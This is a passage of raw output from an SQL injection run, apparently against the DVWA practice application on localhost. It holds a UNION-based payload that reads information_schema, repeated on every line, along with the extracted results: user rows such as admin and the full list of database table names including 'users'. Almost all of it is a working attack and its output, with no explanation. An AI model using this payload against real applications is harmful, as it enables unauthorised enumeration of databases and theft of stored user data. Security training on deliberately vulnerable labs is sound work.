ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_FOREIGN_COLS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_INDEX_CACHE
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_BUFFER_POOL_STATS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_BEING_DELETED
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_FOREIGN
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMPMEM_RESET
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_DEFAULT_STOPWORD
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_TABLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_COLUMNS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_TABLESPACES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_INDEXES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_BUFFER_PAGE
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_VIRTUAL
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: user_variables
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_TABLESPACES_ENCRYPTION
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_LOCK_WAITS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: THREAD_POOL_STATS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: users
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: guestbook
Surname: 
--- End of Extracted Results ---

Database: mysql
URL: http://localhost:4280/vulnerabilities/sqli/
Payload: ' OR 1=1 UNION SELECT table_name FROM information_schema.tables #
Input: id
--- Extracted Results ---
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: admin
Surname: admin
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: Gordon
Surname: Brown
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: Hack
Surname: Me
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: Pablo
Surname: Picasso
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: Bob
Surname: Smith
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: ALL_PLUGINS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: APPLICABLE_ROLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: CHARACTER_SETS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: CHECK_CONSTRAINTS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: COLLATIONS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: COLLATION_CHARACTER_SET_APPLICABILITY
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: COLUMNS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: COLUMN_PRIVILEGES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: ENABLED_ROLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: ENGINES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: EVENTS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: FILES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: GLOBAL_STATUS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: GLOBAL_VARIABLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: KEYWORDS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: KEY_CACHES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: KEY_COLUMN_USAGE
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: OPTIMIZER_TRACE
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: PARAMETERS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: PARTITIONS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: PLUGINS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: PROCESSLIST
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: PROFILING
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: REFERENTIAL_CONSTRAINTS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: ROUTINES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SCHEMATA
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SCHEMA_PRIVILEGES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SESSION_STATUS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SESSION_VARIABLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: STATISTICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SQL_FUNCTIONS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SYSTEM_VARIABLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TABLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TABLESPACES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TABLE_CONSTRAINTS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TABLE_PRIVILEGES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TRIGGERS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: USER_PRIVILEGES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: VIEWS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: CLIENT_STATISTICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INDEX_STATISTICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_CONFIG
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: GEOMETRY_COLUMNS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_TABLESTATS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: SPATIAL_REF_SYS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: USER_STATISTICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_TRX
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMP_PER_INDEX
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_METRICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_DELETED
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMP
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: THREAD_POOL_WAITS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMP_RESET
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: THREAD_POOL_QUEUES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: TABLE_STATISTICS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_FIELDS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_BUFFER_PAGE_LRU
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_LOCKS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_INDEX_TABLE
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMPMEM
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: THREAD_POOL_GROUPS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMP_PER_INDEX_RESET
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_FOREIGN_COLS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_INDEX_CACHE
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_BUFFER_POOL_STATS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_BEING_DELETED
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_FOREIGN
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_CMPMEM_RESET
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_FT_DEFAULT_STOPWORD
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_TABLES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_COLUMNS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_TABLESPACES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_INDEXES
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_BUFFER_PAGE
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_SYS_VIRTUAL
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: user_variables
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_TABLESPACES_ENCRYPTION
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: INNODB_LOCK_WAITS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: THREAD_POOL_STATS
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: users
Surname: 
ID: ' OR 1=1 UNION SELECT table_name,NULL FROM information_schema.tables #
First name: guestbook
Surname: 
--- End of Extracted Results ---

